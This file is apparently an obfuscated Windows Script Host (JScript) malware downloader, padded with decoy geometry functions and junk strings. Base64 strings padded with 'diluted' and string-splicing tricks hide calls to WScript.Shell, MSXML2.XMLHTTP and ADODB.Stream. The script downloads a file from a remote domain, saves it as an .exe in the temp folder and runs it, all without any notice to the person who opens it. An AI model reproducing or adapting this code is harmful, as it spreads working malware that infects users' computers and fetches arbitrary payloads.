
var raillery = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  plaint = [];
	
var opens = { ':': '.','U': 'S','381': 'X'};
	var determined = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function simpsons(esquire) {
	colonization = esquire;
	for (var i in opens){colonization = colonization.replace(i, opens[i]);}
    return colonization;
};

var elixir = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.simpsons4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/diluted/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = raillery[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = raillery[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = raillery[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = raillery[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var headway ="dilutedJVdilutedRFTVdilutedAl".simpsons4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var tobacco = "dilutedQWdilutedN0aXZdilutedlWE9iadilutedmVjdA=diluted=".simpsons4();
String.prototype.simpsons2 = function () {
    var american = {
        winner: this
    };
    american.stable = american.winner["c3Vic3RyaW5n".simpsons4()](determined, elixir);
    return american.stable;
};

var chequered ="dilutedRXhwYW5dilutedkRW52aXdilutedJvbm1lbnRTdHJdilutedpbmdz".simpsons4();
var Native = function(options){
	
};
var pizza = [tobacco, chequered,headway,  ""+"."+("memoir","treatments","dramatic","immigration","cycles","argentina","seeker","grandee","exe"), "UnVu".simpsons4(), simpsons("M"+"SX"+"ML"+("chauffeur","mater","creates","broach","medicare","album","rouge","2.")+"381M"+"LH"+"TT"+("discretionary","character","peach","thoughts","trying","piano","reproduce","basically","P>")+"WU"+("sessions","tomorrow","surgeons","remembered","coordinator","doggerel","newest","cr")+("consuming","derbyshire","cloth","shoppers","preceptor","induction","housework","pumped","ip")+"t:"+("blowing","gasoline","communist","roommates","genealogical","dower","converge","tacit","Sh")+"ell")];
saved = "_F2_";
var races = this[pizza.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
pPndfTlHxXo = "RdvgbsX";
abbess = (("floral", "crucifixion", "obtain", "astronomy", "prosecutor", "modicum", "jefferson", "poUeSrvSmjOj") + "RxTNWgiaM").simpsons2();
premonition = (("asbestos", "reproduction", "rebel", "imprison", "recast", "attends", "chandelier", "liberty", "erica", "sPvBlUdScUNs") + "EuKtLJb").simpsons2();
  
    String.prototype.tariff = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var introduced = pizza.pop().split(">");

edges = "b3Blbg==".simpsons4();
var stocking = new races(introduced[1]);
var puddles = new races(introduced[0]);
var tweed = stocking[pizza.shift()](pizza.shift());
weasel = "E";

var outdone = pizza.shift();
var median = pizza.shift();
function dedication(imported, exceed) {

    try {
        var licensed = tweed + "/" + exceed ;
		licensed = licensed+ outdone;
            puddles[edges](("treasurer","premiere","muddle","jubilee","twinge","radiate","chicks","advance","G" + weasel) + ("ointment","brigadier","arrested","relying","rocky","blank","capabilities","advising","relaxing","finance","T"), imported, false);
       
    puddles[premonition + ("quartz","secret","end")]();
	var writs=("abbess" + WScript=="abbess" + "V2luZG93cyBTY3JpcHQgSG9zdA==".simpsons4())&&puddles["c3RhdHVz".simpsons4()] +""=="MjAw".simpsons4()&&typeof(xINMsuiGiUj)==="undefined";

    if (writs) {
		
        var housewives = new races((("divan","caustic","slighted","cowboy","clink","barnes","lumpy","insinuation","A")+("lamely","disappoint","logan","polish","objectionable","charlotte","inclusive","incidence","SEOO")+"DB"+("peterson","cheshire","advertisement","superintendent","queries","outsourcing","recondite",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        housewives[edges]();
        mqeIqgAPsgS = "_F9_";
        housewives.type = elixir;
        jJSzdCuy = "_F10_";
        housewives["d3JpdGU=".simpsons4()](puddles[("abating","pliable","boulder","lintel","restingplace","weird","myanmar","")+"R"+"es"+"pon"+opens['U'].toLowerCase()+"e"+"Qm9keQ==".simpsons4()]);
        MzhGOSATlTa = "_F11_";
        housewives[(abbess + "o"+("fioricet","yellow","timehonoured","realty","abruptness","malefactor","thered","helpfulness","00")+("prevent","qualifying","dissection","exist","cumshot","thats","hanging","8i")+"tion").replace("0"+("challenges","freight","banns","linda","somewhere","blowjob","workhouse","08"), premonition)] = 0;
        uVnpbdFjl = "_F12_";
        housewives.saveToFile(licensed, 2);
        qOsDIAIDE = "_F13_";
        housewives.close();
        KYyQWcBma = "_F14_";
		stocking[median](licensed, elixir, true);
    }
} catch (hmSQOMFkczO) { };

    Mhirnlj = "_F15_";
}
try{
dedication("aHRdiluted0cDdilutedovLw=diluted=".simpsons4()+"\u0077\u0077\u0077"+"\u002E\u0061\u0062\u0062\u0069\u0067\u006C\u0069\u0061\u006D\u0065\u006E\u0074\u006F\u0074\u006F\u0072\u0069\u006E\u006F\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?lGozSuwwsYB=jpxdVBNU","yBfLulrHENp");}catch(aJzXsX){}

   piRcXwfx = "_F16_";
   